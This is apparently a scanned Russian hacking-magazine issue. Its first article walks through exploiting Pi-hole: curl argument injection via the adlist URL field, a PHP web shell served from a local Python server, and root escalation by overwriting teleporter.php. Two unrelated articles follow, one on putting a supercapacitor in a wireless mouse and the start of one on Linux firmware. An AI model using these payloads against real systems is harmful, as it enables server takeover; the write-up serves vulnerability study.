234:   if [[ ‐r "${saveLocation}" && $url != "file"* ]]; then
...
238:     heisenbergCompensator="‐z ${saveLocation}"
239:   fi

А saveLocation инициализируется в функции gravity_SetDownloadOptions.


gravity.sh
194: gravity_SetDownloadOptions() {
...
201:     url="${sources[$i]}"
202:     domain="${sourceDomains[$i]}"
...
205:     saveLocation="${piholeDir}/list.${i}.${domain}.${
domainsExtension}"
206:     activeDomains[$i]="${saveLocation}"

Как видишь, здесь есть переменная, которую можно контролировать, — do‐
main. Вернемся в файл savesettings.php, где соз дается список доменов.


scripts/pi-hole/php/savesettings.php
722:                if(strlen($_POST["newuserlists"]) > 1)
723:                {
724:                    $domains = array_filter(preg_split('/\r\n|[\
r\n]/', $_POST["newuserlists"]));
725:                    foreach($domains as $domain)
726:                    {
727:                        exec("sudo pihole ‐a adlist add ".
escapeshellcmd($domain));
728:                    }
729:                }

Тут нет никакой проверки на корректность отправленного имени домена, есть
лишь функция escapeshellcmd, которая экранирует символы в переданной
строке. То есть потенциально мы можем передать в качестве домена строку
с пробелами и допол нительными аргу ментами для curl.
   У curl есть несколь ко интересных клю чей, которые можно экс плуатировать.
В нашем случае очень кстати будет ‐o, который позволяет весь вывод
записать в файл. Но в команде уже присутс твует флаг ‐o "${patternBuffer}
". К счастью, curl не испу гает ся повторного фла га, а приоритет отдаст тому,
который встре тился пер вым. Поэто му команда curl ‐o first ‐o second ‐
o third http://ya.ru будет писать в файл строку first.





                   Приоритеты флага ‐o в curl

Давай пробежим ся по процес су добавления данных в блоклист из url.
При первом запуске gravity.sh скрипт проверяет, существует ли файл
с именем из переменной saveLocation. Например, если я добавил http://
ya.ru, то файл будет иметь имя list.0.ya.ru.domains.





   Создание переменной saveLocation при выпол нении скрипта gravity.sh

После этого отрабатывает curl и сохраня ет полученные по этому URL данные
во временный файл.


++ curl ‐s ‐L ‐w '%{http_code}' ‐A 'Mozilla/5.0 (Windows NT 10.0;
Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Chrome/70.0.3538.102 Safari/537.36' http://ya.ru ‐o /tmp/tmp.YRfm‐
rUcFcb.phgpb





   Отладка gravity.sh. curl сохраняет содержимое URL во временный файл

И если сервер ответил 200 (Ok), то данные передаются в функцию gravity_‐
ParseFileIntoDomains.


gravity.sh
277:   httpCode=$(curl ‐s ‐L ${cmd_ext} ${heisenbergCompensator} ‐w
"%{http_code}" ‐A "${agent}" "${url}" ‐o "${patternBuffer}" 2> /dev/
null)
...
290:       case "${httpCode}" in
291:         "200") echo ‐e "${OVER}  ${TICK} ${str} Retrieval
successful"; success=true;;
...
307:   if [[ "${success}" == true ]]; then
...
313:       gravity_ParseFileIntoDomains "${patternBuffer}" "${
saveLocation}"

Здесь имя временного файла изменяется на переменную saveLocation.


gravity.sh
329: gravity_ParseFileIntoDomains() {
330:   local source="${1}" destination="${2}" firstLine abpFilter
...
381:     output=$( { mv "${source}" "${destination}"; } 2>&1 )





         Отладка gravity.sh. Переименование временного файла




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ

     ДЫРЫ В ДЫРЕ
              КАК РАБОТАЮТ УЯЗВИМОСТИ В PI‐HOLE,
                         КОТОРЫЕ ПОЗВОЛЯЮТ
                          ЗАХВАТИТЬ RASPBERRY PI




После того как скрипт отра ботал, в директории /etc/pinhole появляется
наш файл.





  Файл с содержимым стра ницы ya.ru пос ле выполнения скрипта gravity.sh

Запустим скрипт gravity.sh еще раз. Теперь, когда файл существует, в curl
будет добав лен heisenbergCompensator и флаг ‐z.


heisenbergCompensator='‐z /etc/pihole/list.0.ya.ru.domains'





  Повторный запуск gravity.sh использует переменную heisenbergCompen‐
  sator при формировании аргументов к curl

В результате вызов curl будет выглядеть так:


curl ‐s ‐L ‐z /etc/pihole/list.0.ya.ru.domains ‐w '%{http_code}' ‐A
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (
KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36' http://ya.ru
‐o /tmp/tmp.EbjhVz4huF.phgpb

Теперь нам нужно сформировать корректный пейлоад. Понадобится сервер,
который вернет 200 и код, который мы хотим выполнить. Сделаем простей‐
ший шелл на PHP.


shell.php
<?php
echo system($_GET["c"]);

И под нимем сервер, который будет его возвращать в ответ на любой запрос.
Я буду использовать http.server.


serv.py
01: import http.server
02: import socketserver
03: import sys
04:
05: class MyHttpRequestHandler(http.server.SimpleHTTPRequestHandler):
06:     def do_GET(self):
07:         self.path = 'shell.php'
08:         return http.server.SimpleHTTPRequestHandler.do_GET(self)
09:
10: handler_object = MyHttpRequestHandler
11: my_server = socketserver.TCPServer(("192.168.99.1", 80),
handler_object)
12: try:
13:     print("Server started.")
14:     my_server.serve_forever()
15: except KeyboardInterrupt:
16:     print("Shutting down...")
17:     my_server.socket.close()
18:     sys.exit(0)
19:





        Простой веб‐сервер на Python, который возвращает шелл

Также нужно, чтобы curl делал запрос на сервер и не учитывал остальные
параметры, которые я добавлю для эксплуата ции. В этом нам поможет сим‐
вол #.


http://192.168.99.1#

Затем указываем флаг ‐o и имя файла как параметр.


http://192.168.99.1# ‐o shell.php

Попробуем добавить эту строку в качестве URL.





                Запуск Gravity с полезной нагрузкой

Видим, что запрос на сервер пришел, файл успешно создан и содержит
полезную нагрузку. Благо в Linux имя файла — вещь гибкая и никаких проб‐
лем такая строка в качестве него не соз даст.
   Теперь повторный запуск.





      Повторный запуск Gravity с полезной нагрузкой в качестве URL

Наши аргументы добавлены, одна ко подс трока .domains в расширении фай‐
ла создает проблемы. Нужно ее как‐то убрать.


curl ‐s ‐L ‐z /etc/pihole/list.0.192.168.99.1# ‐o shell.php.domains
‐w '%{http_code}' ‐A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/
537.36' 'http://192.168.99.1# ‐o shell.php' ‐o /tmp/tmp.cjh4aohrRE.
phgpb





  Шелл был создан с дополнитель ным расширением .domains, которое
  необходимо убрать

У curl множество флагов, поэто му есть сра зу несколько вариантов, которые
нам могут помочь. Самый прос той — это добавить еще один флаг ‐z, тогда .
domains будет использоваться как метка времени. Естес твенно, некоррек‐
тная, но нам это не важно.


http://192.168.99.1# ‐o shell.php ‐z

Передадим в качестве URL этот пейлоад и получим шелл на сервере.





        Загрузка шелла в Pi‐hole через манипуляции с URL в Gravity

В консоли все отрабатывает хорошо, но для добавления такого пей лоада
в качестве URL через веб‐форму нужно допол нительно добавить кавычки.


http://192.168.99.1#" ‐o shell.php ‐z"

Это необходимо, чтобы скрипт pihole рас познал его как один параметр, а не
несколько, в про цессе добавления URL они будут удалены. После того
как эксплоит успешно отра ботает, ты найдешь шелл по адре су http://pi‐
hole.vh/admin/scripts/pi‐hole/php/shell.php?c=uname%20‐a.





  Выполнение произволь ного кода через добавление специально сфор‐
  мированного URL в блоклист


ПОВЫШЕНИЕ ПРИВИЛЕГИЙ ДО ROOT
Если ты обратил внимание, то из PHP утилита pihole вызывается через sudo.
К сожалению, юзер www‐data не может использовать sudo без пароля.





        Правила вызова sudo для пользователя www‐data в Pi‐hole

Но если нем ного пошариться в скриптах, можно найти функцию Teleporter,
которая находится в файле webpage.sh.


advanced/Scripts/webpage.sh
540: Teleporter() {
541:     local datetimestamp=$(date "+%Y‐%m‐%d_%H‐%M‐%S")
542:     php /var/www/html/admin/scripts/pi‐hole/php/teleporter.php >
"pi‐hole‐teleporter_${datetimestamp}.tar.gz"
543: }
...
567: main() {
568:     args=("$@")
569:
570:     case "${args[1]}" in
...
593:         "‐t" | "teleporter"   ) Teleporter;;

Эта функция вызывается из pihole, когда ука зан флаг ‐a.


pihole
027: webpageFunc() {
028:   source "${PI_HOLE_SCRIPT_DIR}/webpage.sh"
029:   main "$@"
030:   exit 0
031: }
...
443: case "${1}" in
...
463:   "‐a" | "admin"                ) webpageFunc "$@";;

Вот и легкий спо соб повысить привилегии! С помощью предыдущего экспло‐
ита перезаписываем файл teleporter.php, добавляем в него необходимые
команды и вызываем его при помощи команды sudo ‐a ‐t.


teleporter.php
1: <?php
2: system('id > id.txt');





        Повышение привилегий в Pi‐hole до суперпользователя

Полуавтоматические версии экспло итов можешь найти в репозитории автора
уязвимости.


ДЕМОНСТРАЦИЯ УЯЗВИМОСТИ (ВИДЕО)





ЗАКЛЮЧЕНИЕ
Несмотря на серьезность рас смотренных проб лем, они часто встречаются
даже в крупных проектах. Конечно, здесь импакт снижается тем, что нужно
быть авторизованным пользователем, чтобы успешно проэксплу атировать
уязвимости, но что‐то мне подска зывает, что немного поресерчив, можно
найти XSS или CSRF, которая позволит в один клик захватить систему.
   Так что если ты исполь зуешь Pi‐hole, то следи за обновле ниями и старайся
всегда работать с последней версией дистрибутива. К сожалению, автомати‐
ческого обновления здесь не предусмотрено, но в футере страницы есть
панелька, которая оповещает о наличии новых версий.





   Панель, которая показывает актуальность версий компонентов Pi‐hole

К тому же несколько месяцев назад вышло крупное обновление — вер‐
сия 5.0. Возможно, там было уделено большее внимание безопасности сис‐
темы. Или нет?
ТРЮКИ

 КАК ПРОКАЧАТЬ
МЫШЬ





                                          Candidum
                                                 duospirit@gmail.com

     СТАВИМ СУПЕРКОНДЕНСАТОР
    В БЕСПРОВОДНУЮ МЫШЬ, ЧТОБЫ
       ЗАРЯЖАТЬ ЕЕ ЗА СЕКУНДЫ




Производители  кла виатур и мышей предлагают  тысячи
устройств на любой вкус, но собрать комплект с нуж ными
характеристиками по‐прежнему непросто. Впрочем, если ты
готов взять в руки паяльник и творчески доработать завод‐
ской вариант, то тебе открываются новые воз можности.
Сегодня мы опытным путем проверим,  есть ли смысл
переводить мышь на питание от ионистора вместо стандар‐
тных батареек.


Современная беспроводная мышь — весь ма удобная штука. Еще лет десять
назад они постоянно раз ряжались, теряли связь с компьютером и стоили
неприлично дорого (по сравнению со своими «хвостатыми» соб ратьями).
Но теперь даже такие мыши расстались с большинством своих детских
болячек. Сегодня в продаже можно найти устройства с модулем Bluetooth,
которым не  требуется  отдельный радиоприемник, компактные модели
для поездок и даже бес проводные геймерские мыши с низким временем
отклика.
  И все с ними как будто замеча тельно, за исклю чением одного: незави‐
симо от того, питается ли такая мышка от батареек или аккумулятора, их
заряд имеет свой ство пропадать в самый неподходящий момент. Конечно,
батарейки можно поставить новые, а акку муляторы зарядить, но первые надо
еще найти, а вто рые требуют на подзарядку какое‐то время.
  Причем, даже если выставить на источнике питания ток на уровне 2С–3С,
что не очень хорошо для здоровья акку муляторов и увеличивает их износ,
минут 20–30 все же придется подождать. Поэтому я на такой слу чай всегда
держу поблизости запасной заряженный аккумуля тор. Тебе это знакомо? :)
  И вот однажды мне на глаза попался лежащий без дела ионистор (он же
суперконденсатор), который ког да‐то был при обретен без особой цели и с
тех пор терпеливо ждал своего часа. Вопрос нап рашивался сам собой и был
отнюдь не праздным: а долго ли протянет с ним мышь, при условии, что сред‐
ний ток потребления у нее на уровне 5 мА (при напряжении 3 В)? Забегая
вперед: долго и даже очень долго. Но только при обя зательном условии, что
ионистор будет подоб ран пра вильно.
  Впрочем, обо всем по порядку.


             INFO

                      Беспроводные мышки  со  встроенным  супер‐
                       конденсатором  сегодня  уже можно  встретить
                        в продаже в ассорти мен те известных брендов.
                     На  фоне  решений  с  питанием  от  батареек
                      или аккумуляторов они по‐прежнему составляют
                       исчезающе малую долю, а высокая цена прочно
                      держит их в нишевой категории «для энтузиас‐
                           тов». Желающие могут почитать обзоры на такие
                        устройства, как Genius DX‐ECO, Mad Catz  Air
                      и Razer Mamba Hyperﬂux.



ТЕОРИЯ
Итак, что же представляет собой ионис тор? По своим характеристикам он
очень похож на конденсатор, за исключени ем одной важной детали: у ионис‐
торов просто чудовищно большая емкость, от нес кольких единиц до тысяч
фарад. Все дело в том, что ионистор запаса ет энергию в двойном электри‐
ческом слое, возникающем на поверхнос ти электро дов, погруженных в элек‐
тролит. В результате диэлектриком служит монос лой молекул растворителя.
Как следствие, его толщина может составлять порядка единиц ангстрем,
а это чертовски малые величины.
   Если ты хоть немного помнишь школьные уро ки физики, емкость кон‐
денсатора прямо пропорциональна пло щади его обкладок и обратно про‐
порциональна расстоянию между ними. Таким обра зом, за счет применения
в ионисторах пористых материалов (обычно — активированный уголь) пло‐
щадь поверхности возрастает многократно. Это и позволя ет суперконден‐
саторам запасать огромные зна чения энергии. Кро ме того, у них, как пра‐
вило, низкие токи утечки, что помога ет держать заряд значительное время.
  Разумеется,  у  ионисторов  есть  и  недос татки. В  первую  очередь
это высокая цена, относительно низкое рабочее напряжение (порядка нес‐
кольких вольт на ячейку) и существенно меньшая плотность энергии в срав‐
нении с аккумуляторами. Так что на роль идеального источника питания
на все случаи жизни они, увы, не подходят.
  Впрочем, некото рые ухищрения поз воляют все же час тично справиться
с перечисленными недостатками. Нап ример, при легировании анода литием
удается поднять рабочее напряжение до 3,8 В. Такие компоненты обычно
называют литиевыми конденсатора ми и относят к гибридно му классу. Они
имеют несколько клю чевых особен ностей, приятных и не очень. Во‐первых,
у литиевых конденсаторов существенно меньший самораз ряд даже на фоне
классических ионисторов (не говоря уже об обычных конденсаторах). Во‐вто‐
рых, они крайне чувствительны к переразряду. Как правило, в опи сании про‐
изводитель   предупрежда ет,   что   разряд   литиевого   конденсатора
ниже 2,2 В приводит к деградации ано да, потере емкости и снижению внут‐
реннего сопротивления компонента.


СРАВНЕНИЕ
Теперь давай сравним несколько источни ков питания, чтобы при мерно оце‐
нить перспективность всей затеи. Обычная компьютерная мышь, помимо
батареек, может питаться и от перезаряжаемого NiMH‐аккумулятора фор‐
мата АА. Именно с ним мы и будем сравнивать оба ионис тора — большой,
размерами примерно с батарейку D и заявленны ми характеристиками
на уровне 500 Ф и 2,7 В, а также маленький литиевый, емкостью на 100 Ф
и  напряжением  3,8  В.  Сам  NiMH‐аккумуля тор  стандартного  нап‐
ряжения 1,4 В и средней емкости, рассчитан на 1500 мА ⋅ ч.
  Важный момент: сравнивать их между собой в лоб не получится, так
как разряд аккумулятора описывается уравнени ем Нернста. Собс твенно,
этим  уравнением  описываются  все  химичес кие  источники  питания.
Как следствие, график раз ряда аккумулятора имеет плато по центру и резкий
спад в конце, а его емкость измеряется в ампер‐часах и рас считывается
как площадь под плато на гра фике. Конденсатор, в свою очередь, разряжа‐
ется по экспоненте (при условии, что сопротивление нагрузки пос тоянно),
и его емкость измеряется в фарадах.
  Впрочем, выход есть: придется сравнивать запасенную энергию в джо‐
улях. Итак, для конденса тора (или ионистора):

                               2               E = (C × U ) ÷ 2

Здесь C — емкость в фарадах, а U — нап ряжение в вольтах. Для акку муля‐
тора:

               E = 3600 × Q × U

Здесь Q — емкость в ампер‐часах, а U — среднее напряжение. Для NiMH‐
аккумулятора напряжение на полностью заряженном эле менте составляет
примерно 1,4 В, а для раз ряженного — около 0,9 В. Однако, так как падение
напряжения при разрядке нелинейно, возьмем среднее на уровне 1,1 В (все
равно это приблизитель ные расчеты).
   Теперь у нас получа ются такие зна чения: 5940 Дж для аккумуля тора,
1822 Дж для большого ионистора и 722 Дж для маленького. Выглядит неп‐
лохо, особенно учитывая, что последний по раз меру примерно как аккумуля‐
тор. Но тут есть один нюанс: если в случае аккумуля тора это та энергия,
которую мы из него сможем взять, то с ионисторами чуть хитрее.
   Как   я  уже   упоминал,   литиевый  ионистор   нельзя   разряжать
ниже 2,2 В (забегая вперед, ска жу, что мы также не будем заряжать его
выше 3,3 В). Это дает нам в ито ге 302 Дж на один цикл. С большим ионис‐
тором другая штука — он плохо держит заряд выше 2,2 В, особенно при быс‐
тром  заряде,  на  который  мы  целимся.  Раз рядить  его  с  пользой
ниже 0,5 В тоже не выйдет (из‐за чисто технических ограниче ний). Впрочем,
последнее не вносит заметной потери, так что здесь мы имеем около 542 Дж.
   Тут уже неплохо видно преимущество литиевого конденсатора. Все же
стоит учитывать, что он по размеру раз в семь меньше своего аналога. Впро‐
чем, на мой вкус, преимущество не нас только велико, как его описывают
в рекламных статьях. И не стоит забывать о раз нице в цене — такие ионис‐
торы достаточно дорогие.
  С учетом всех замеча ний в итоге получа ем такие значения: те же 5940 Дж
для аккумулятора, примерно 542 Дж в большом ионисторе на 500 Ф и 302 Дж
в его младшем соб рате на 100 Ф. Уже не так опти мистично. Хорошо, а на
сколько этого хватит компь ютер ной мыши?
  Современная недорогая беспро водная мышь потребляет примерно 4 мА
в активном режиме и значительно меньше в режиме ожидания. Для простоты
будем считать, что грызун у нас всегда в активном состоянии и напряжение
питания у него 3 В. Это дает нам 43 Дж/ч.
   Таким образом, в первом приближении от большого ионистора мышь дол‐
жна проработать двенадцать часов, а от малень кого порядка семи часов.
Конечно, эти расчеты лишь приблизительные, но они позволяют оценить
общую перспективность идеи. И на самом деле она весьма неплоха, если
учесть, что большой суперконденсатор можно зарядить секунд за тридцать,
а маленький и того быстрее. Таким образом, в теории наш манипулятор смо‐
жет запасти достаточно энергии на весь рабочий день всего лишь за время
загрузки ОС.


Литиевые конденсаторы
Такие конденсаторы стоят силь но дороже даже классических ионисторов,
и продают их заряженными. Поэто му, если надумаешь рас кошелиться, обра‐
ти внимание, чтобы напряжение на нем было выше 2,2 В, а сам конденсатор
обязательно был не взду тый. Здесь я хочу поблагодарить Faberge, который
предоставил литиевый конденса тор VLCRS3R8107MG на 100 Ф для моего
проекта.
  С этим конденсатором была целая история. Его заказали в одном извес‐
тном магазине, причем извес тном не в последнюю очередь своими высокими
ценами. Первый же кон денса тор, который отту да прислали, оказал ся вздутым
и разряженным. Впрочем, в ответ на претензию магазин оперативно и без
лишних возражений выслал замену. А мне таким образом удалось сравнить
между собой бракованный и рабочий экземпляры.
  Выяснилось,  что  взду тый разряженный конденсатор сильно потерял
в качестве и по саморазряду стал напоминать клас сические ионис торы (PDF),
которые легко заказать в Китае. Особых нюансов тут нет, раз ве что качество
раз на раз не приходится. Впро чем, несколько циклов заряд‐раз ряд и дли‐
тельный заряд идут им на пользу.



АНАТОМИЯ ГРЫЗУНОВ
Как правило, в основе типичной беспроводной мыши лежит специализиро‐
ванная микросхема, которая сама по себе реализует 99% функций устрой‐
ства. В нее входит и сам сенсор, и схемы управления под светкой, и модуль
обработки сигнала от сенсора, и даже ради опередатчик. На такие контрол‐
леры откровенно китайского ширпотреба бывает проблематично най ти
даташит, но нас в данном случае интересу ет толь ко питание.
  К нашей большой радости контроллеры меж ду собой полностью сов‐
местимы и требуют напряжение в диапа зоне от 2,1 до 3,6 В. В подтвержде‐
ние этих слов ты можешь заг лянуть в даташит PAW3702 (PDF), на которой
собрана самая приличная из рас куроченных мной мышей.


             INFO

                      Схемотехника устройств классом и ценой повыше
                     может заметно отличаться. В них нередко при‐
                     меняется отдельный мик роконтроллер, который
                       позволяет  управлять  кучей  парамет ров,  заг‐
                       ружать настройки непосредственно в мышь и соз‐
                        давать цепочки из мак росов на все случаи жизни.


Обыкновенно мыши пита ются от одной или двух батаре ек AA (или ААА).
Это приводит нас к очевидному выводу: если батарейки две, то они подклю‐
чаются к контроллеру напрямую (ста билизатор не ставят в том числе из сооб‐
ражений экономии), а если батарейка одна, то меж ду ней и контроллером
установлен step‐up DC/DC‐преобра зова тель, вроде того, который я исполь‐
зовал в эмулято ре мыши, — ME2108. Най ти его на плате совсем несложно,
чаще всего это трехлапая микросхема рядом с дросселем.
  А что в этом случае будем делать мы? А мы будем делать так же! :)


Здоровое питание
Иными словами, если у нас в мыша имплантируется литиевый ионистор, то
его будем подключать напрямую к контроллеру. При этом удаляем повыша‐
ющий преобразователь, отпа ивая микросхему и дроссель и соединяя
перемычкой питание с контроллером. Он как раз даст нам диапазон нап‐
ряжений как в даташите.
  А когда используется ионистор попроще с максимальным напряжени‐
ем 2,7 В, то его выход мы будем повышать с помощью упомяну того выше пре‐
образователя. Если же его в мыши изначально не было, то его придется туда
добавить. Благо они состоят буквально из нес кольких деталей и даже про‐
даются в виде готовых модулей за сущие копей ки. Вроде бы всё… Хотя нет,
стоит еще поговорить о защите от перераз ряда.
  На всякий случай еще раз повторю, что лити евые ионисторы не рекомен‐
дуется разряжать ниже 2,2 В. Да, ты это наверняка уже запомнил, но, поверь,
эти штуки стоят недешево, и обращаться с ними следует акку ратно. Поэтому
нам будет необходимо устройство, которое сможет отключать нагрузку
от ионистора при достижении порогового зна чения. Подобные устройства
широко применяются для защиты лити евых аккумуляторов от перераз ряда,
отличие нашего варианта состоит в мень шем напряжении срабаты вания.
Схема устройства представлена на рисунке ниже.





В целом все здесь элементарно, и пояснения тут требует раз ве что кнопка,
которая нужна для включения устройства. Достаточно ее один раз нажать,
и мышь будет работать до тех пор, пока напряжение на ионисторе не упадет
ниже 2,2–2,3 В, что зачас тую происхо дит скачкообразно. Значение порого‐
вого напряжения задается светодиодом и резис торами R2 и R3.
  Светодиод тут выполняет одновременно функцию стабилитрона (красный
светодиод дает око ло 1,7 В падения нап ряжения) и индикатора включения,
но светится он не бодро. Точно подс тра ивать напряжение срабаты вания
удобно, меняя номинал R2. В качес тве ключа использован до безобразия
дешевый  полевик  AO3400,  что  помога ет  свес ти  падение  напряжения
на устройстве практически к нулю. Одна ко сойдет и любой другой N‐каналь‐
ный полевик, способ ный открыться от нап ряжения порядка 2 В. Биполярный
транзистор может быть любой, хоть КТ361.
  Во вклю ченном состоянии устройство потребляет меньше 100 мкА, а в
выключенном потребление и вовсе пренеб режимо мало.


КОРПУС И КОНСТРУКТИВ
Приступим к сборке готового устройства. А для этого нам потребуется донор.


Нулевой пациент
Первой мне под руку попалась заезженная и много повидавшая на своем
веку мышь Perfeo PF‐353‐WOP. На ней я и опробовал идею, встроив в эту
мышь самый большой ионистор. А для того, чтобы полностью использовать
заряд, я поместил в нее повышающий модуль на ME2108‐33. Модуль взял
в этот раз готовый. Одна незадача — ионистор был великоват. Впрочем,
с этой проблемой мне отчасти помог лоб зик.





Модуль повышающего преобра зователя здорово встал на место разъ ема
подклю чения батарейки.





Как легко понять из фотог рафий, ионистор заменил собой купированную зад‐
нюю часть и крепился при помощи суперклея. Пос кольку сам корпус мыши я
подпиливал снова и снова, то получилось неп лохо подогнать его, и держится
он нормально. Обрати внимание, что, несмотря на вульгарную простоту конс‐
трукции современных дешевых мышей, оптический узел (линза, диод и дат‐
чик) должны быть достаточно точно спозициони рованы. Иначе резво бегать,
как прежде, мышь уже не будет.





Зарядка тоже сурова: к выводам ионистора я цеп ляю вольтметр и, контро‐
лируя напряжение, подаю 3,3 В от компьютер ного блока питания с помощью
«крокодилов». Зарядный ток при этом составляет порядка 6 А. Что еще можно
о ней сказать? Мышь работает, одного заряда хватает на пери од от двух
до четырех дней, в зависимос ти от интенсивности использования.


                                     Продолжение статьи →
ТРЮКИ               ← НАЧАЛО СТАТЬИ
      КАК ПРОКАЧАТЬ
         МЫШЬ
                   СТАВИМ СУПЕРКОНДЕНСАТОР
                 В БЕСПРОВОДНУЮ МЫШЬ, ЧТОБЫ
                        ЗАРЯЖАТЬ ЕЕ ЗА СЕКУНДЫ





Первый пошел
За основу следующей итерации была взя та мышь Oklick 6055W. К моему удив‐
лению, ее уменьшенный размер совершенно не помешал встроить в нее вто‐
рой ионистор.





Аккуратно срезаем батарейный отсек, сохраняя крепеж крышки. Для деликат‐
ной резки пластика можно использовать нож, ручной лобзик или нитку. При‐
менять тут раскален ный нож и паяльник не рекомендую: уж очень много вони
будет, да и паяльник жалко.





Далее встраиваем разъем для зарядки ионистора.  Тут мне пришлось
поломать  голову,  где  взять разъ ем минимального размера,  чтобы он
одновременно выдерживал ток в несколько ампер, позволял подцепляться
вольтметром, да еще вместо ответной части поддерживал какой попало сур‐
рогат. Как оказалось, всем этим требованиям удовлетворяет цанговый разъ‐
ем, что используется в панельках для DIP‐микросхем. Он и маленький, и, счи‐
тай, цельнометаллический.
   Устанавливаем его в крышку батарейного отсека и фиксируем каплей
суперклея. Надо сказать, что если пропил сделан точно, то он и без клея
сидит как влитой.





Также необходимо прос верлить отверстие 3,5 мм под SMD‐кнопку, вклю‐
чающую контроллер разряда ионистора. Сама тактовая кнопка тоже фиксиру‐
ется суперклеем.
   Теперь время занять ся платой мыши: мы демонтируем дроссель и мик‐
росхему DC/DC‐преобразователя и вместо  них  запаиваем перемычку,
соединяющую элемент питания с контрол лером. Далее надо изготовить кон‐
троллер разряда — по существу, слишком громкое название для схе мы
из восьми деталей.





      Главное — заранее на макетке подобрать номиналы резис торов





       Гораздо симпатичнее все это выглядит уже на печатной плате

Осталось соединить все узлы и закрепить ионистор на двухсторонний скотч.
Легко заметить разъем зарядки и кнопку вклю чения. К несчастью, защиты
от дурака тут не предусмотрено, так как прос тейший вариант с установкой
диода здесь не прокатит, а усложнять схему мне не хотелось.





           WARNING

                    При подключении внимательно следи за поляр‐
                        ностью,  иначе  ионистор  может  превратиться
                        в тык ву, выплюнув в тебя свои потроха, а мышка
                       безвозвратно перенесется в мышиный рай.


Полевые испытания показали, что от убитого литиевого конденсатора мышь
работает один‐два дня. Сколько именно — зависит от интенсивности исполь‐
зования. Как ни странно, даже бракованный ионистор продемонстрировал
вполне достойный результат. Тем интереснее было посмотреть, как себя
проявит исправный суперконденсатор!


Второй шанс
В этот раз под нож отправилась мышь поприличнее — A4Tech FStyler FG10.
А процесс пошел уже по накатанной. :)





Точно так же я выпилил из грызуна батарей ный отсек и вмонтировал разъ ем
зарядки, который заранее был перемещен в более безопас ное место.





С платы также удален повышающий преобразователь. Обрати внимание:
в этой мыши уже исполь зуется микросхема в SMD‐исполнении, так же как и
дроссель. Впрочем, схема от этого меняется не сильно, и перемычка впа‐
ивается точно так же.





Теперь можно подклю чать контроллер раз ряда и собирать все обратно.





Единственная неприятность была свя зана с шурупом, на котором держится
крышка. Чтобы его закрутить, нужно снять крышку батарейного отсека,
но наши модификации этого сделать уже не поз воля ют. Так что я просверлил
дополнительное отверстие, через которое закручива ется шуруп.





От исправного литиевого ионистора мышь стабиль но работает двое суток
при активном использовании. И я думаю, это весьма достойный результат.


ЗАРЯДКА
В заключение пара слов о зарядном устрой стве для таких мышей. До этого я
о нем упоминал лишь вскользь, но именно оно обеспечивает быс трую заряд‐
ку ионисторов. Я использую стандартный компьютерный блок питания
на 300 Вт.
  Для литиевых ионисторов все тривиально: с помощью спе циального
шнурка мышь на 20 с подключается к линии 3,3 В на разъ еме БП, пос ле чего
можно считать, что зарядка закончена. Сам шну рок максимально прост:
на одном конце цанговый разъем (папа), а на дру гом — «крокодилы» для под‐
клю чения к БП.





Вместо компьютерного блока можно использовать лабораторный, и тогда
напряжение удастся поднять уже до 3,6 В и время работы устройства уве‐
личится.
  С обычными ионисторами нес колько сложнее, так как у них номинальное
напряжение 2,7 В. Впрочем, и их я тоже заряжаю от линии 3,3 В, только
дополнительно контролирую напряжение на ионисторе вольтметром, прек‐
ращая заряд на отметке около 2,5 В. Из‐за громадной емкости в 500 Ф заряд
даже током в 6 А протека ет вовсе не мгновенно, и его вполне можно уследить
по вольтметру. А избыток напряжения просаживается на проводах, от чего
они заметно нагреваются. Весь процесс занимает не больше 30 с.
  Была у меня также идея вставить в раз рыв диод, чтобы понизить нап‐
ряжение и отказаться от вольтметра, но на диод надо ставить хороший ради‐
атор, иначе его очень скоро навес тит белый полярный пушистый зверек. Так
что я на время отказался от такой идеи. Как ты понимаешь, в этом слу чае
лабораторный БП будет осо бенно хорош.
  Несколько слов стоит сказать и про режим заряда. Ионисторы способны
к быстрому заряду, одна ко после этого нап ряжение на них просаживается
на 10–30% за несколь ко десятков минут в зависи мости от качества ионис‐
тора. Проблема решается длительным зарядом, в даташитах рекомендуют
держать на ионисторе заданное напряжение около две надцати часов
для полного заряда. Это действитель но работа ет, но на практике в реальной
жизни эти потери несущес твенны и ими вполне мож но пренебречь.


ИДЕИ И УЛУЧШЕНИЯ
А что же даль ше? Развивать тему можно в нес коль ких направле ниях. Сюда
определенно стоит добавить систему бес проводного заряда, хотя это, конеч‐
но, заметно усложнит всю конструкцию. С беспро водной зарядкой можно
и ионистор поменьше ста вить, особенно если зарядку допол нительно встро‐
ить в коврик. Есть даже подходящая публикация от 2007 года с концептом.
Также, возможно, стоит использовать для литиевых ионисторов step‐down‐
преобразователь с 2,2 В на выходе. Но тут все же нужно сначала подсчитать,
даст ли это реальный выигрыш во времени работы, так как КПД такого пре‐
образователя далеко не сто процентов.
ТРЮКИ




       ТОЛЬКО
       САМОЕ
      Даниил Батурин
   Координатор проекта VyOS
    (https://vyos.io), «языковед»,
    функциональщик, иногда
     сетевой администратор
         daniil@baturin.org      НУЖНОЕ

                   ИЗБАВЛЯЕМ LINUX
               ОТ БАГАЖА ПРОШИВОК
                ДЛЯ ОБОРУДОВАНИЯ





Разработчики  Linux поддерживают не только множество
драйверов устройств в исходном коде ядра, но и боль шую
коллекцию прошивок к устройствам в пакете linux‐ﬁrmware.
Но когда размер системы имеет значение — нужно отсечь
лишнее. Модули ядра легко отключить в make menuconﬁg,
а вот выбрать нуж ные прошивки сложнее. Поэтому сегодня
мы  напишем  скрипт,  который  позволит  тебе  извлечь
из   полугигабайтной   коллекции  прошивок  несколько
мегабайт, нужных именно твоей машине.


С железом нередко бывает так, что одного драй вера в прос транстве ядра ОС
для его работы недостаточно. Нужна также прошивка (ﬁrmware), которая заг‐
ружается в само устрой ство. Точный формат и наз начения прошивки зачас‐
тую известны только производителю: иногда это программа для микрокон‐
троллера или FPGA, а иногда просто набор данных. Пользователю это не важ‐
но, главное, что устрой ство не работа ет, если ОС не загрузит в него прошив‐
ку.
  В свободных операционных системах прошивки нередко вызывают споры.
Многие из них распростра няются под нес вободными лицензиями и без
исходного кода. Авторы OpenBSD и ряда дистрибутивов GNU/Linux считают
это проблемой и со свободой, и с безопасностью и принципиально не вклю‐
чают такие прошив ки в установочный образ.
